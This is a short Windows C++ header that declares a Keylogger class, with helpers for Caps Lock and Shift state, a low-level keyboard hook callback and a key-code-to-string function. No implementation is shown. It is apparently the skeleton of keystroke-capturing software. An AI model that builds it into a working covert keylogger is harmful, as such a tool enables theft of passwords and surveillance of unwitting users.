#pragma once
#include <Windows.h>
#include <string>

class Keylogger {
public:
    static bool IsCapsLockOn();
    static bool IsShiftPressed();
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
    static std::string GetKeyString(UINT vkCode);
};